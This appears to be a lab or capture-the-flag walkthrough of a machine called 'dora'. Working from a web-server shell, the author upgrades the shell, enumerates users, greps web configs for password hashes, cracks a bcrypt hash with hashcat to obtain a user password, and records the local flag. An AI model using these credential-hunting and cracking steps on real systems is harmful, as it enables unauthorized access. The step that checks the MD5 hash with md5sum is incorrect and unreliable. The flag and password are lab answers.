Upgrade shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
(Ctrl-Z)
stty raw -echo; fg
```

# System Information Gathering

## Get current user and group memberships.

```
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## /etc/passwd contents
```
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dora:x:1000:1000::/home/dora:/bin/sh
```

No other interesting users. dora is the only regular user (uid >= 1000).

www-data cannot write to /etc/passwd.

www-data **can** read /home/dora!

Here I find local.txt, but lack the permissions to read it.

## Hostname

```
hostname
```

```
dora
```

## Get Operating System

```
cat /etc/issue
cat /etc/os-release
uname -a
```

```
Ubuntu 20.04.6 LTS \n \l

www-data@dora:/$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
www-data@dora:/$ uname -a
Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

# Credential Hunting

## Configuration Files
```
# Database configs
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(database|db|mysql|postgres|mongo)"

# Web application configs
find /var/www -name "*.php" -o -name "*.config" -o -name "*.ini" 2>/dev/null
grep -r "password\|passwd\|pwd" /var/www/ 2>/dev/null
```

No luck, but /var/www/html/filemanager/config/.htaccess contains password hashes for admin and dora:

```
<?php
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
);
```

As we know, admin's password is 'admin'. Pasting this hash into Google suggests its MD5, and we can confirm with `echo -n '21232f297a57a5a743894a0e4a801fc3' | md5sum`.

I'll copy dora's hash (`$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`) to a file on my attacking machine, dora.hash. I see it uses bcrypt (identifier $2a) which is mode 3200 in hashcat.

`hashcat -m 3200 dora.hash /usr/share/wordlists/rockyou.txt`

It cracks quickly and reveals the password as `doraemon`

![[Pasted image 20251005132851.png]]

Now I'll `su dora` and use this password to change users. 
/home/dora/local.txt:
d7d1198f67e8e44cf0a15bc1ac5f8d39

# Continue: [[dora -> root]]
